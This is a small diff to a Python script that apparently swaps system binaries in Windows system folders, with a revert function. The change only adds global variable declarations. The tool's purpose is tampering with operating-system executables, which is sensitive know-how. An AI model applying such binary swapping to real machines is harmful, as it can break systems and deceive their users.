@@ -104,6 +104,8 @@ def getFiles(directories):
 
 #main binary swapping function
 def binswap(rename=0):
+	global dest #so our change to dest takes place when used in other functions
+
 	#pick directories based on OS
 	if operatingSystem == "windows":
 		dirs = ["C:\Windows", "C:\Windows\System32"]
@@ -172,6 +174,8 @@ def binswap(rename=0):
 
 #revert binaries back to original
 def revert():
+	global dest #so our change to dest takes place when used in other functions
+
 	#pick directories based on OS
 	if operatingSystem == "windows":
 		dirs = ["C:\Windows", "C:\Windows\System32"]
